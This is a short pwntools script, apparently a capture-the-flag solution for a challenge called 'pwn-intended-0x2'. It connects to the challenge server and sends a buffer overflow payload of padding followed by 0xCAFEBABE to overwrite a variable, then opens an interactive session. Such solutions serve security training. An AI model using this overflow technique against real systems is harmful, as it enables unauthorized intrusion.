from pwn import *


#p = process("pwn-intended-0x2")
p = remote("chall.csivit.com", "30007")
size = 0x30 - 0x4
p.sendline("A"*size + p64(0xCAFEBABE))

print("A"*size + p64(0xCAFEBABE))
p.interactive()